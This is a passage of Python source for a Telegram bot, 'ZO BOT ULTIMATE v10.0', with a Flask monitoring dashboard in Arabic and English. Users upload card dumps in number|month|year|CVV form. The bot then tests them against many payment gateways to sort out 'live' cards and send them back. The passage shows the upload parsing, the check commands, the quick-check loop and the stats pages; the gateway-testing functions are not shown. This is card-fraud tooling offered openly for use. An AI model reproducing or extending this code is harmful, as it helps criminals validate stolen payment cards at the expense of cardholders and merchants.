                
                <div class="card">
                    <div class="card-title">
                        <i class="fas fa-credit-card"></i> إحصائيات البوت
                    </div>
                    <div class="stats-grid">
                        <div class="stat-item">
                            <div class="stat-label">الفحوصات النشطة</div>
                            <div class="stat-value">{{ bot.active_checks }}</div>
                        </div>
                        <div class="stat-item">
                            <div class="stat-label">المستخدمين</div>
                            <div class="stat-value">{{ bot.total_users }}</div>
                        </div>
                        <div class="stat-item">
                            <div class="stat-label">البطاقات المحملة</div>
                            <div class="stat-value">{{ bot.total_cards }}</div>
                        </div>
                        <div class="stat-item">
                            <div class="stat-label">البطاقات الناجحة</div>
                            <div class="stat-value">{{ bot.total_live_cards }}</div>
                        </div>
                        <div class="stat-item">
                            <div class="stat-label">البوابات المتاحة</div>
                            <div class="stat-value">{{ gateways_total }}</div>
                        </div>
                        <div class="stat-item">
                            <div class="stat-label">حجم التخزين المؤقت</div>
                            <div class="stat-value">{{ bot.cache_size }}</div>
                        </div>
                    </div>
                </div>
                
                <div class="card">
                    <div class="card-title">
                        <i class="fas fa-network-wired"></i> الشبكة والأداء
                    </div>
                    <div class="stats-grid">
                        <div class="stat-item">
                            <div class="stat-label">الطلبات النشطة</div>
                            <div class="stat-value">{{ bot.active_requests }}/{{ bot.queue_size }}</div>
                        </div>
                        <div class="stat-item">
                            <div class="stat-label">الخيوط</div>
                            <div class="stat-value">{{ bot.thread_count }}</div>
                        </div>
                        <div class="stat-item">
                            <div class="stat-label">ذاكرة البوت</div>
                            <div class="stat-value">{{ "%.1f"|format(system.process_memory_mb) }} م.ب</div>
                        </div>
                        <div class="stat-item">
                            <div class="stat-label">الشبكة المرسلة</div>
                            <div class="stat-value">{{ "%.1f"|format(system.network_sent_mb) }} م.ب</div>
                        </div>
                    </div>
                </div>
            </div>
            
            <div class="buttons-container">
                <a href="/status" class="btn btn-primary">
                    <i class="fas fa-chart-line"></i> حالة مفصلة
                </a>
                <a href="/health" class="btn btn-success">
                    <i class="fas fa-heartbeat"></i> فحص الصحة
                </a>
                <a href="/stats" class="btn btn-warning">
                    <i class="fas fa-chart-bar"></i> إحصائيات كاملة
                </a>
                <a href="/cleanup" class="btn btn-primary">
                    <i class="fas fa-broom"></i> تنظيف الذاكرة
                </a>
                <a href="/logs" class="btn btn-success">
                    <i class="fas fa-file-alt"></i> السجلات
                </a>
                <a href="/gateways" class="btn btn-warning">
                    <i class="fas fa-door-open"></i> البوابات
                </a>
            </div>
            
            <div class="log-container">
                <div class="card-title">
                    <i class="fas fa-history"></i> آخر السجلات
                </div>
                {% for line in logs.split('\\n')[-20:] %}
                    {% if line %}
                    <div class="log-line">
                        <span class="timestamp">[{{ line.split(' - ')[0] if ' - ' in line else '' }}]</span>
                        {% if 'INFO' in line %}
                            <span class="level-info">INFO</span>
                        {% elif 'WARNING' in line %}
                            <span class="level-warning">WARNING</span>
                        {% elif 'ERROR' in line %}
                            <span class="level-error">ERROR</span>
                        {% endif %}
                        {{ line.split(' - ', 2)[-1] if ' - ' in line else line }}
                    </div>
                    {% endif %}
                {% endfor %}
            </div>
            
            <div class="footer">
                <p>🛸 ZO BOT ULTIMATE v10.0 | تم التطوير بواسطة Alpha | @NAPGF</p>
                <p>آخر تحديث: {{ timestamp }}</p>
            </div>
        </div>
        
        <script>
            // تحديث الصفحة كل 30 ثانية
            setTimeout(() => {
                location.reload();
            }, 30000);
            
            // تأثيرات تفاعلية
            document.querySelectorAll('.card').forEach(card => {
                card.addEventListener('mouseenter', () => {
                    card.style.transform = 'translateY(-5px) scale(1.02)';
                });
                
                card.addEventListener('mouseleave', () => {
                    card.style.transform = 'translateY(0) scale(1)';
                });
            });
            
            // عرض التنبيهات
            function showNotification(message, type = 'info') {
                const notification = document.createElement('div');
                notification.style.cssText = `
                    position: fixed;
                    top: 20px;
                    right: 20px;
                    padding: 15px 25px;
                    background: ${type === 'success' ? 'linear-gradient(45deg, #00b09b, #96c93d)' : 
                                 type === 'warning' ? 'linear-gradient(45deg, #ff9a00, #ff5e00)' : 
                                 'linear-gradient(45deg, #4361ee, #3f37c9)'};
                    color: white;
                    border-radius: 10px;
                    z-index: 1000;
                    animation: slideIn 0.3s;
                    box-shadow: 0 5px 15px rgba(0,0,0,0.3);
                `;
                
                notification.innerHTML = `
                    <i class="fas fa-${type === 'success' ? 'check-circle' : 
                                       type === 'warning' ? 'exclamation-triangle' : 'info-circle'}"></i>
                    ${message}
                `;
                
                document.body.appendChild(notification);
                
                setTimeout(() => {
                    notification.style.animation = 'slideOut 0.3s';
                    setTimeout(() => notification.remove(), 300);
                }, 3000);
            }
            
            // إضافة الأنيميشن
            const style = document.createElement('style');
            style.textContent = `
                @keyframes slideIn {
                    from { transform: translateX(100%); opacity: 0; }
                    to { transform: translateX(0); opacity: 1; }
                }
                
                @keyframes slideOut {
                    from { transform: translateX(0); opacity: 1; }
                    to { transform: translateX(100%); opacity: 0; }
                }
            `;
            document.head.appendChild(style);
        </script>
    </body>
    </html>
    '''
    
    return render_template_string(html_template,
        uptime=stats['uptime'],
        system=stats['system'],
        bot=stats['bot'],
        gateways_total=stats['gateways_total'],
        timestamp=datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
        logs=get_recent_logs()
    )

@app.route('/status')
def status_page():
    """صفحة الحالة التفصيلية"""
    stats = get_system_stats()
    
    return jsonify({
        'status': 'online',
        'timestamp': stats['timestamp'],
        'uptime': stats['uptime'],
        'system': stats['system'],
        'bot': stats['bot'],
        'performance': {
            'max_concurrent_checks': MAX_CONCURRENT_CHECKS,
            'max_threads': MAX_THREADS,
            'request_timeout': REQUEST_TIMEOUT,
            'cache_duration': CACHE_DURATION
        },
        'channels': REQUIRED_CHANNELS,
        'gateways': {
            'total': len(GATEWAYS),
            'most_used': sorted(stats['bot']['gateway_stats'].items(), key=lambda x: x[1], reverse=True)[:5]
        }
    })

@app.route('/health')
def health_check():
    """فحص صحة النظام"""
    try:
        # اختبار الاتصال بالبوت
        bot.get_me()
        bot_status = "healthy"
    except Exception as e:
        bot_status = f"unhealthy: {str(e)}"
    
    # اختبار الاتصال بالإنترنت
    try:
        requests.get('https://google.com', timeout=5)
        internet_status = "connected"
    except:
        internet_status = "disconnected"
    
    return jsonify({
        'status': 'health_check',
        'timestamp': datetime.now().isoformat(),
        'services': {
            'telegram_bot': bot_status,
            'flask_server': 'running',
            'internet_connection': internet_status,
            'database': 'in_memory_healthy',
            'thread_pool': f'{thread_pool._max_workers} workers'
        },
        'resources': {
            'cpu_usage': f"{psutil.cpu_percent()}%",
            'memory_usage': f"{psutil.virtual_memory().percent}%",
            'disk_usage': f"{psutil.disk_usage('/').percent}%"
        }
    })

@app.route('/stats')
def stats_page():
    """صفحة الإحصائيات الكاملة"""
    stats = get_system_stats()
    
    html_template = '''
    <!DOCTYPE html>
    <html lang="ar" dir="rtl">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>📊 إحصائيات كاملة - ZO BOT</title>
        <style>
            body {
                font-family: Arial, sans-serif;
                margin: 0;
                padding: 20px;
                background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
                color: white;
            }
            .container { max-width: 1200px; margin: 0 auto; }
            .header { text-align: center; padding: 30px 0; }
            .section { background: rgba(255,255,255,0.1); padding: 20px; margin: 20px 0; border-radius: 10px; }
            .grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(250px, 1fr)); gap: 15px; }
            .stat-card { background: rgba(0,0,0,0.2); padding: 15px; border-radius: 8px; }
            .stat-value { font-size: 24px; font-weight: bold; color: #4cc9f0; }
            .stat-label { font-size: 14px; opacity: 0.8; }
            h2 { color: #4cc9f0; border-bottom: 2px solid #4cc9f0; padding-bottom: 10px; }
            table { width: 100%; border-collapse: collapse; margin-top: 15px; }
            th, td { padding: 12px; text-align: right; border-bottom: 1px solid rgba(255,255,255,0.1); }
            th { background: rgba(0,0,0,0.3); }
            .back-btn { display: inline-block; padding: 10px 20px; background: #4cc9f0; color: white; text-decoration: none; border-radius: 5px; margin-top: 20px; }
        </style>
    </head>
    <body>
        <div class="container">
            <div class="header">
                <h1>📊 الإحصائيات الكاملة للنظام</h1>
                <p>آخر تحديث: {{ timestamp }}</p>
                <a href="/" class="back-btn">← العودة للرئيسية</a>
            </div>
            
            <div class="section">
                <h2>📈 إحصائيات البوت</h2>
                <div class="grid">
                    <div class="stat-card">
                        <div class="stat-value">{{ bot.active_checks }}</div>
                        <div class="stat-label">فحوصات نشطة</div>
                    </div>
                    <div class="stat-card">
                        <div class="stat-value">{{ bot.total_users }}</div>
                        <div class="stat-label">مستخدمين</div>
                    </div>
                    <div class="stat-card">
                        <div class="stat-value">{{ bot.total_cards }}</div>
                        <div class="stat-label">بطاقات محملة</div>
                    </div>
                    <div class="stat-card">
                        <div class="stat-value">{{ bot.total_live_cards }}</div>
                        <div class="stat-label">بطاقات ناجحة</div>
                    </div>
                </div>
            </div>
            
            <div class="section">
                <h2>💻 إحصائيات النظام</h2>
                <div class="grid">
                    <div class="stat-card">
                        <div class="stat-value">{{ "%.1f"|format(system.cpu_percent) }}%</div>
                        <div class="stat-label">استخدام المعالج</div>
                    </div>
                    <div class="stat-card">
                        <div class="stat-value">{{ "%.1f"|format(system.memory_percent) }}%</div>
                        <div class="stat-label">استخدام الذاكرة</div>
                    </div>
                    <div class="stat-card">
                        <div class="stat-value">{{ "%.1f"|format(system.disk_percent) }}%</div>
                        <div class="stat-label">استخدام القرص</div>
                    </div>
                    <div class="stat-card">
                        <div class="stat-value">{{ uptime.formatted }}</div>
                        <div class="stat-label">وقت التشغيل</div>
                    </div>
                </div>
            </div>
            
            <div class="section">
                <h2>🌐 البوابات الأكثر استخداماً</h2>
                <table>
                    <tr>
                        <th>رقم البوابة</th>
                        <th>عدد الاستخدامات</th>
                    </tr>
                    {% for gw, count in gateways %}
                    <tr>
                        <td>بوابة {{ gw + 1 }}</td>
                        <td>{{ count }}</td>
                    </tr>
                    {% endfor %}
                </table>
            </div>
            
            <div class="section">
                <h2>⚙️ إعدادات الأداء</h2>
                <div class="grid">
                    <div class="stat-card">
                        <div class="stat-value">{{ performance.max_concurrent_checks }}</div>
                        <div class="stat-label">فحوصات متزامنة</div>
                    </div>
                    <div class="stat-card">
                        <div class="stat-value">{{ performance.max_threads }}</div>
                        <div class="stat-label">الحد الأقصى للخيوط</div>
                    </div>
                    <div class="stat-card">
                        <div class="stat-value">{{ performance.request_timeout }}s</div>
                        <div class="stat-label">مهلة الطلب</div>
                    </div>
                    <div class="stat-card">
                        <div class="stat-value">{{ performance.cache_duration }}s</div>
                        <div class="stat-label">مدة التخزين المؤقت</div>
                    </div>
                </div>
            </div>
        </div>
    </body>
    </html>
    '''
    
    return render_template_string(html_template,
        timestamp=datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
        bot=stats['bot'],
        system=stats['system'],
        uptime=stats['uptime'],
        gateways=stats['bot']['gateway_stats'].items(),
        performance=stats.get('performance', {})
    )

@app.route('/cleanup')
def cleanup_page():
    """صفحة تنظيف الذاكرة"""
    with memory_lock:
        before_users = len(user_sessions)
        before_cache = len(gateway_cache)
        
        # تنظيف الجلسات القديمة
        users_to_remove = []
        current_time = datetime.now()
        for user_id, session in user_sessions.items():
            if 'last_update' in session:
                if (current_time - session['last_update']).total_seconds() > 3600:
                    users_to_remove.append(user_id)
        
        for user_id in users_to_remove:
            if user_id in user_dumps:
                del user_dumps[user_id]
            if user_id in user_sessions:
                del user_sessions[user_id]
            if user_id in user_live_cards:
                del user_live_cards[user_id]
            if user_id in user_check_processes:
                del user_check_processes[user_id]
            if user_id in user_selected_gateways:
                del user_selected_gateways[user_id]
        
        # تنظيف التخزين المؤقت
        cache_to_remove = []
        for key, (cache_time, _) in gateway_cache.items():
            if (current_time - cache_time).total_seconds() > CACHE_DURATION:
                cache_to_remove.append(key)
        
        for key in cache_to_remove:
            del gateway_cache[key]
        
        after_users = len(user_sessions)
        after_cache = len(gateway_cache)
    
    return jsonify({
        'status': 'cleanup_completed',
        'timestamp': datetime.now().isoformat(),
        'results': {
            'users_removed': before_users - after_users,
            'cache_removed': before_cache - after_cache,
            'remaining_users': after_users,
            'remaining_cache': after_cache,
            'total_memory_freed': f"{(before_users - after_users) * 50 + (before_cache - after_cache) * 2} KB (تقريباً)"
        }
    })

@app.route('/logs')
def logs_page():
    """صفحة السجلات"""
    logs = get_recent_logs(100)
    
    html_template = '''
    <!DOCTYPE html>
    <html>
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>📝 سجلات النظام - ZO BOT</title>
        <style>
            body {
                font-family: 'Courier New', monospace;
                margin: 0;
                padding: 20px;
                background: #1a1a2e;
                color: #00ff00;
            }
            .container { max-width: 1200px; margin: 0 auto; }
            .header { text-align: center; padding: 20px 0; }
            .log-container { 
                background: rgba(0,0,0,0.5); 
                padding: 20px; 
                border-radius: 5px;
                max-height: 600px;
                overflow-y: auto;
                border: 1px solid #00ff00;
            }
            .log-line { 
                padding: 5px 0; 
                border-bottom: 1px solid rgba(0,255,0,0.1);
                font-size: 12px;
            }
            .timestamp { color: #00ffff; }
            .level-info { color: #00ff00; }
            .level-warning { color: #ffff00; }
            .level-error { color: #ff0000; }
            h1 { color: #00ff00; text-shadow: 0 0 10px #00ff00; }
            .back-btn { 
                display: inline-block; 
                padding: 10px 20px; 
                background: #00ff00; 
                color: #000; 
                text-decoration: none; 
                border-radius: 5px; 
                margin: 10px;
                font-weight: bold;
            }
            .controls { text-align: center; margin-bottom: 20px; }
        </style>
    </head>
    <body>
        <div class="container">
            <div class="header">
                <h1>📝 سجلات النظام</h1>
                <div class="controls">
                    <a href="/" class="back-btn">🏠 الرئيسية</a>
                    <a href="javascript:location.reload()" class="back-btn">🔄 تحديث</a>
                    <a href="javascript:clearLogs()" class="back-btn">🗑️ مسح السجلات</a>
                </div>
            </div>
            
            <div class="log-container" id="logContainer">
                {% for line in logs.split('\\n') %}
                    {% if line %}
                    <div class="log-line">
                        <span class="timestamp">[{{ line.split(' - ')[0] if ' - ' in line else '' }}]</span>
                        {% if 'INFO' in line %}
                            <span class="level-info">INFO</span>
                        {% elif 'WARNING' in line %}
                            <span class="level-warning">WARNING</span>
                        {% elif 'ERROR' in line %}
                            <span class="level-error">ERROR</span>
                        {% endif %}
                        {{ line.split(' - ', 2)[-1] if ' - ' in line else line }}
                    </div>
                    {% endif %}
                {% endfor %}
            </div>
        </div>
        
        <script>
            // التمرير التلقائي للأسفل
            document.addEventListener('DOMContentLoaded', function() {
                const container = document.getElementById('logContainer');
                container.scrollTop = container.scrollHeight;
            });
            
            // تحديث تلقائي كل 10 ثواني
            setInterval(() => {
                location.reload();
            }, 10000);
            
            function clearLogs() {
                if (confirm('هل تريد مسح جميع السجلات؟')) {
                    fetch('/clear-logs', { method: 'POST' })
                        .then(response => response.json())
                        .then(data => {
                            alert(data.message);
                            location.reload();
                        });
                }
            }
        </script>
    </body>
    </html>
    '''
    
    return render_template_string(html_template, logs=logs)

@app.route('/clear-logs', methods=['POST'])
def clear_logs():
    """مسح ملف السجلات"""
    try:
        open('bot_log.log', 'w').close()
        return jsonify({'status': 'success', 'message': 'تم مسح السجلات بنجاح'})
    except Exception as e:
        return jsonify({'status': 'error', 'message': str(e)})

@app.route('/gateways')
def gateways_page():
    """صفحة البوابات"""
    html_template = '''
    <!DOCTYPE html>
    <html lang="ar" dir="rtl">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>🌐 البوابات - ZO BOT</title>
        <style>
            body {
                font-family: Arial, sans-serif;
                margin: 0;
                padding: 20px;
                background: linear-gradient(135deg, #1e3c72 0%, #2a5298 100%);
                color: white;
            }
            .container { max-width: 1200px; margin: 0 auto; }
            .header { text-align: center; padding: 30px 0; }
            .gateway-list { 
                display: grid; 
                grid-template-columns: repeat(auto-fill, minmax(300px, 1fr)); 
                gap: 15px; 
                margin-top: 20px;
            }
            .gateway-card { 
                background: rgba(255,255,255,0.1); 
                padding: 15px; 
                border-radius: 10px;
                border-left: 5px solid #4cc9f0;
            }
            .gateway-number { 
                background: #4cc9f0; 
                color: #000; 
                width: 30px; 
                height: 30px; 
                border-radius: 50%; 
                display: inline-flex; 
                align-items: center; 
                justify-content: center; 
                margin-left: 10px;
                font-weight: bold;
            }
            .gateway-url { 
                font-family: monospace; 
                font-size: 12px; 
                color: #00ff00;
                word-break: break-all;
                margin-top: 10px;
            }
            h1 { color: #4cc9f0; }
            .back-btn { 
                display: inline-block; 
                padding: 10px 20px; 
                background: #4cc9f0; 
                color: white; 
                text-decoration: none; 
                border-radius: 5px; 
                margin-top: 20px;
            }
            .stats { 
                background: rgba(0,0,0,0.3); 
                padding: 15px; 
                border-radius: 10px; 
                margin: 20px 0;
                text-align: center;
            }
        </style>
    </head>
    <body>
        <div class="container">
            <div class="header">
                <h1>🌐 قائمة البوابات المتاحة</h1>
                <p>إجمالي {{ gateways|length }} بوابة نشطة</p>
                <a href="/" class="back-btn">← العودة للرئيسية</a>
            </div>
            
            <div class="stats">
                <h3>📊 إحصائيات البوابات</h3>
                <p>البوابات المتاحة: {{ gateways|length }}</p>
                <p>آخر تحديث: {{ timestamp }}</p>
            </div>
            
            <div class="gateway-list">
                {% for i, gateway in gateways %}
                <div class="gateway-card">
                    <div>
                        <span class="gateway-number">{{ i + 1 }}</span>
                        <strong>البوابة {{ i + 1 }}</strong>
                    </div>
                    <div class="gateway-url">{{ gateway }}</div>
                    <div style="margin-top: 10px; font-size: 12px; opacity: 0.8;">
                        الحالة: <span style="color: #00ff00;">✅ نشطة</span>
                    </div>
                </div>
                {% endfor %}
            </div>
        </div>
    </body>
    </html>
    '''
    
    return render_template_string(html_template,
        gateways=enumerate(GATEWAYS),
        timestamp=datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    )

# ============================================
# 🤖 دوال البوت الرئيسية
# ============================================

@bot.message_handler(commands=['start', 'help'])
def send_welcome(message):
    not_subscribed = check_subscription(message.from_user.id)
    
    if not_subscribed:
        welcome = f"""
<b>🛸 ZO BOT ULTIMATE v10.0</b>
<i>High-Performance Card Checking System</i>

<b>⚠️ الاشتراك إجباري!</b>
يجب الاشتراك في القنوات التالية:

{chr(10).join([f'• @{channel["username"]}' for channel in not_subscribed])}

<b>📞 المطور:</b> @NAPGF
"""
        
        bot.send_message(
            message.chat.id,
            welcome,
            parse_mode='HTML',
            reply_markup=create_subscription_markup()
        )
        return
    
    welcome = f"""
<b>🛸 ZO BOT ULTIMATE v10.0</b>
<i>Complete Card Checking System with Full Monitoring</i>

<b>✅ الاشتراك مؤكد!</b>
يمكنك الآن استخدام جميع مميزات البوت

<b>🎯 المميزات الجديدة:</b>
• صفحة مراقبة متكاملة 🌐
• إحصائيات حية في الوقت الحقيقي 📊
• نظام تنظيف تلقائي للذاكرة 🧹
• تحمل ضغط عالي (يصل إلى {MAX_CONCURRENT_CHECKS} فحص متزامن)
• {len(GATEWAYS)} بوابة نشطة

<b>📥 كيفية الاستخدام:</b>
1. أرسل الكروت كنص أو ملف .txt
2. اضغط على 🔍 Check Cards
3. شاهد التقدم في الوقت الحقيقي
4. احصل على الكروت الناجحة تلقائياً!

<b>🌐 لوحة المراقبة:</b>
<code>http://your-server-ip:8080</code>

<b>⚡ الأوامر:</b>
/check - بدء الفحص
/quick - فحص سريع (5 كروت)
/stats - إحصائيات
/gateways - قائمة البوابات
/status - حالة النظام
/clear - مسح جميع البيانات
/help - هذه الرسالة

<b>🔥 جاهز لفحص بعض الكروت!</b>
<b>📞 المطور:</b> @NAPGF
"""
    
    bot.send_message(
        message.chat.id,
        welcome,
        parse_mode='HTML',
        reply_markup=create_main_menu()
    )

@bot.message_handler(commands=['check'])
def check_command(message):
    not_subscribed = check_subscription(message.from_user.id)
    
    if not_subscribed:
        subscription_msg = f"""
<b>❌ اشتراك مطلوب!</b>

يجب الاشتراك في القنوات التالية:

{chr(10).join([f'• @{channel["username"]}' for channel in not_subscribed])}
"""
        bot.send_message(
            message.chat.id,
            subscription_msg,
            parse_mode='HTML',
            reply_markup=create_subscription_markup()
        )
        return
    
    user_id = message.from_user.id
    
    with memory_lock:
        dumps = user_dumps.get(user_id, [])
    
    if not dumps:
        bot.send_message(
            message.chat.id,
            "<b>❌ لا توجد كروت محملة!</b>\n\nأرسل كروتك أولاً (نص أو ملف .txt)",
            parse_mode='HTML'
        )
        return
    
    loading_msg = f"""
<b>🔍 Card Check Ready</b>

<b>📦 Loaded Cards:</b> {len(dumps)}
<b>🌐 Available Gateways:</b> {len(GATEWAYS)}
<b>⚡ Estimated Time:</b> {len(dumps) * 1.5:.0f} seconds
<b>🎯 Auto-send: ENABLED ✅</b>

<b>Click 🚀 Start Check to begin</b>
"""
    
    sent_msg = bot.send_message(
        message.chat.id,
        loading_msg,
        parse_mode='HTML',
        reply_markup=create_check_buttons()
    )
    
    with memory_lock:
        if user_id not in user_sessions:
            user_sessions[user_id] = {}
        user_sessions[user_id]['control_msg_id'] = sent_msg.message_id
        user_sessions[user_id]['username'] = message.from_user.first_name

@bot.message_handler(commands=['quick'])
def quick_check_command(message):
    not_subscribed = check_subscription(message.from_user.id)
    
    if not_subscribed:
        subscription_msg = f"""
<b>❌ اشتراك مطلوب!</b>

يجب الاشتراك في القنوات التالية:

{chr(10).join([f'• @{channel["username"]}' for channel in not_subscribed])}
"""
        bot.send_message(
            message.chat.id,
            subscription_msg,
            parse_mode='HTML',
            reply_markup=create_subscription_markup()
        )
        return
    
    user_id = message.from_user.id
    
    with memory_lock:
        dumps = user_dumps.get(user_id, [])
    
    if not dumps:
        bot.send_message(message.chat.id, "❌ No cards loaded!", parse_mode='HTML')
        return
    
    quick_dumps = random.sample(dumps, min(5, len(dumps)))
    
    quick_msg = "<b>⚡ Quick Check Results:</b>\n\n"
    live_count = 0
    
    for dump in quick_dumps:
        gateway = random.choice(GATEWAYS[:10])
        result_type, result_info = check_single_dump(dump, gateway)
        
        card = dump.split('|')[0]
        quick_msg += f"{result_info['emoji']} <code>{card[:6]}...{card[-4:]}</code> → {result_info['status']}\n"
        
        if result_type == "live":
            live_count += 1
    
    quick_msg += f"\n<b>✅ Checked {len(quick_dumps)} cards | Live: {live_count}</b>"
    
    bot.send_message(message.chat.id, quick_msg, parse_mode='HTML')

@bot.message_handler(commands=['stats'])
def stats_command(message):
    not_subscribed = check_subscription(message.from_user.id)
    
    if not_subscribed:
        subscription_msg = f"""
<b>❌ اشتراك مطلوب!</b>

يجب الاشتراك في القنوات التالية:

{chr(10).join([f'• @{channel["username"]}' for channel in not_subscribed])}
"""
        bot.send_message(
            message.chat.id,
            subscription_msg,
            parse_mode='HTML',
            reply_markup=create_subscription_markup()
        )
        return
    
    user_id = message.from_user.id
    
    with memory_lock:
        dumps_count = len(user_dumps.get(user_id, []))
        session = user_sessions.get(user_id, {})
        live_count = len(user_live_cards.get(user_id, []))
    
    stats_msg = f"""
<b>📊 System Statistics</b>
────────────────────
<b>👤 User:</b> {message.from_user.first_name}
<b>📁 Loaded Cards:</b> {dumps_count}
<b>💰 Live Cards:</b> {live_count}
<b>🌐 Gateways:</b> {len(GATEWAYS)}

<b>📈 Current Session:</b>
• Checked: {session.get('checked', 0)}
• Live: {session.get('live', 0)}
• Declined: {session.get('declined', 0)}

<b>⚡ Active Checks:</b> {sum(1 for s in user_sessions.values() if s.get('is_checking', False))}

<b>🕒 Time:</b> {datetime.now().strftime('%H:%M:%S')}
────────────────────
<b>🚀 System Ready!</b>
"""
    
    bot.send_message(message.chat.id, stats_msg, parse_mode='HTML')

@bot.message_handler(commands=['gateways'])
def gateways_command(message):
    not_subscribed = check_subscription(message.from_user.id)
    
    if not_subscribed:
        subscription_msg = f"""
<b>❌ اشتراك مطلوب!</b>

يجب الاشتراك في القنوات التالية:

{chr(10).join([f'• @{channel["username"]}' for channel in not_subscribed])}
"""
        bot.send_message(
            message.chat.id,
            subscription_msg,
            parse_mode='HTML',
            reply_markup=create_subscription_markup()
        )
        return
    
    response = f"<b>🌐 Available Gateways: {len(GATEWAYS)}</b>\n\n"
    
    for i, gateway in enumerate(GATEWAYS[:10], 1):
        domain = gateway.split('//')[1].split('/')[0]
        response += f"{i}. <code>{domain}</code>\n"
    
    if len(GATEWAYS) > 10:
        response += f"\n<b>... and {len(GATEWAYS)-10} more gateways</b>"
    
    response += "\n\n<b>⚡ Use /check to start scanning</b>"
    
    bot.send_message(message.chat.id, response, parse_mode='HTML')

@bot.message_handler(commands=['status'])
def bot_status_command(message):
    """حالة النظام في البوت"""
    stats = get_system_stats()
    
    status_msg = f"""
<b>📈 System Status Report - ZO BOT v10.0</b>
══════════════════════════════════════════

<b>🤖 حالة البوت:</b>
• الفحوصات النشطة: {stats['bot']['active_checks']}
• المستخدمين: {stats['bot']['total_users']}
• البطاقات المحملة: {stats['bot']['total_cards']}
• البطاقات الناجحة: {stats['bot']['total_live_cards']}
• البوابات المتاحة: {len(GATEWAYS)}

<b>💻 حالة النظام:</b>
• وقت التشغيل: {stats['uptime']['formatted']}
• استخدام الذاكرة: {stats['system']['memory_percent']:.1f}%
• استخدام المعالج: {stats['system']['cpu_percent']:.1f}%
• استخدام القرص: {stats['system']['disk_percent']:.1f}%

<b>⚡ الأداء:</b>
• الطلبات النشطة: {stats['bot']['active_requests']}/{stats['bot']['queue_size']}
• الخيوط: {stats['bot']['thread_count']}
• التخزين المؤقت: {stats['bot']['cache_size']}

<b>🌐 لوحة المراقبة:</b>
<code>http://your-server-ip:8080</code>

<b>⏰ آخر تحديث:</b> {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
══════════════════════════════════════════
<b>✅ النظام يعمل بشكل طبيعي</b>
"""
    
    bot.send_message(message.chat.id, status_msg, parse_mode='HTML')

@bot.message_handler(commands=['clear'])
def clear_command(message):
    not_subscribed = check_subscription(message.from_user.id)
    
    if not_subscribed:
        subscription_msg = f"""
<b>❌ اشتراك مطلوب!</b>

يجب الاشتراك في القنوات التالية:

{chr(10).join([f'• @{channel["username"]}' for channel in not_subscribed])}
"""
        bot.send_message(
            message.chat.id,
            subscription_msg,
            parse_mode='HTML',
            reply_markup=create_subscription_markup()
        )
        return
    
    user_id = message.from_user.id
    
    with memory_lock:
        if user_id in user_dumps:
            del user_dumps[user_id]
        if user_id in user_sessions:
            del user_sessions[user_id]
        if user_id in user_live_cards:
            del user_live_cards[user_id]
        if user_id in user_check_processes:
            del user_check_processes[user_id]
    
    bot.send_message(message.chat.id, "✅ All data cleared! Send new cards to start.", parse_mode='HTML')

@bot.message_handler(func=lambda message: message.text and '|' in message.text and not message.text.startswith('/'))
def receive_dumps_text(message):
    not_subscribed = check_subscription(message.from_user.id)
    
    if not_subscribed:
        subscription_msg = f"""
<b>❌ اشتراك مطلوب!</b>

يجب الاشتراك في القنوات التالية:

{chr(10).join([f'• @{channel["username"]}' for channel in not_subscribed])}
"""
        bot.send_message(
            message.chat.id,
            subscription_msg,
            parse_mode='HTML',
            reply_markup=create_subscription_markup()
        )
        return
    
    user_id = message.from_user.id
    dumps = parse_dumps_from_text(message.text, user_id)
    
    if dumps:
        response = f"""
<b>✅ Cards Loaded Successfully!</b>

<b>📊 Total Cards:</b> {len(dumps)}
<b>👤 User:</b> {message.from_user.first_name}

<b>📝 Example Card:</b>
<code>{dumps[0] if dumps else 'N/A'}</code>

<b>🔥 Ready to check {len(dumps)} cards!</b>

<b>Use 🔍 Check Cards or /check</b>
"""
        bot.send_message(message.chat.id, response, parse_mode='HTML', reply_markup=create_main_menu())
    else:
        bot.send_message(message.chat.id, """
<b>❌ Invalid Format!</b>

<b>📋 Correct Formats:</b>
<code>5154623718346424|07|2030|480</code>
<code>5154623718346424|07|30|480</code>
<code>5154623718346424|0727|480</code>

<b>🔍 Please check your format and try again</b>
""", parse_mode='HTML')

@bot.message_handler(content_types=['document'])
def receive_dumps_file(message):
    not_subscribed = check_subscription(message.from_user.id)
    
    if not_subscribed:
        subscription_msg = f"""
<b>❌ اشتراك مطلوب!</b>

يجب الاشتراك في القنوات التالية:

{chr(10).join([f'• @{channel["username"]}' for channel in not_subscribed])}
"""
        bot.send_message(
            message.chat.id,
            subscription_msg,
            parse_mode='HTML',
            reply_markup=create_subscription_markup()
        )
        return
    
    user_id = message.from_user.id
    
    try:
        file_info = bot.get_file(message.document.file_id)
        downloaded_file = bot.download_file(file_info.file_path)
        content = downloaded_file.decode('utf-8', errors='ignore')
        
        dumps = parse_dumps_from_text(content, user_id)
        
        response = f"""
<b>📁 File Received!</b>

<b>📊 Cards Loaded:</b> {len(dumps)}
<b>📦 File Name:</b> {message.document.file_name}
<b>👤 User:</b> {message.from_user.first_name}

<b>🔥 Ready to check {len(dumps)} cards!</b>

<b>Click 🔍 Check Cards to start</b>
"""
        bot.send_message(message.chat.id, response, parse_mode='HTML', reply_markup=create_main_menu())
        
    except Exception as e:
        bot.send_message(message.chat.id, f"<b>❌ Error reading file:</b> {str(e)[:100]}", parse_mode='HTML')

@bot.callback_query_handler(func=lambda call: True)
def handle_inline_buttons(call):
    user_id = call.from_user.id
    chat_id = call.message.chat.id
    message_id = call.message.message_id
    
    if call.data == "check_subscription":
        not_subscribed = check_subscription(user_id)
        
        if not_subscribed:
            error_msg = f"""
<b>❌ لم تنضم لكل القنوات!</b>

<b>القنوات المتبقية:</b>
{chr(10).join([f'• @{channel["username"]}' for channel in not_subscribed])}

<b>انضم للقنوات ثم اضغط على زر التحقق مرة أخرى</b>
"""
            bot.edit_message_text(
                error_msg,
                chat_id=chat_id,
                message_id=message_id,
                parse_mode='HTML',
                reply_markup=create_subscription_markup()
            )
        else:
            success_msg = """
<b>✅ اشتراك مؤكد!</b>

